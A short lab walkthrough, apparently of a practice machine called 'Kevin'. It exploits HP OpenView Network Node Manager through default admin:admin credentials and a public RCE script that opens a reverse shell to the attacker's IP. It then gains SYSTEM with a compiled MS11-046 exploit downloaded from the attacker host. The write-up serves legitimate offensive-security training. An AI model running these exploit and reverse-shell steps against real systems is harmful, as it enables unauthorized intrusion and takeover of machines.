# Kevin

> HP OpenView / MS11-046

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.45

PORT      STATE SERVICE            VERSION
80/tcp    open  http               GoAhead WebServer
| http-auth:
|_ HTTP/1.1 401 Unauthorized -- Basic realm=HP Network Node Manager
8080/tcp  open  http               GoAhead WebServer
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows XP microsoft-ds
3389/tcp  open  ms-wbt-server      Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Enumerating port 80
HP Network Node Manager running. Default credentials admin:admin worked.
```shell
# Search Exploit
searchsploit HP OpenView
HP OpenView Network Node Manager 7.53 - Remote Code Execution  | windows/remote/10536.py

searchsploit -m 10536
```
### Initial Access
```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Exploit
python2 10536.py 192.168.182.45 80 192.168.45.242 443

# Evidence
type C:\Documents and Settings\Administrator\Desktop\local.txt
```
### Privilege Escalation
The machine is running Windows XP SP3, vulnerable to MS11-046.
```shell
# MS11-046
searchsploit ms11-046
Microsoft Windows XP SP3 / 2003 SP2 - afd.sys Privilege Escalation  | windows/local/40564.c

# Compile
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32

# Transfer and execute
iwr -uri http://192.168.45.242/40564.exe -outfile 40564.exe
.\40564.exe
```
### Post-Exploitation
```shell
# Evidence
ipconfig
type C:\Documents and Settings\Administrator\Desktop\proof.txt
```
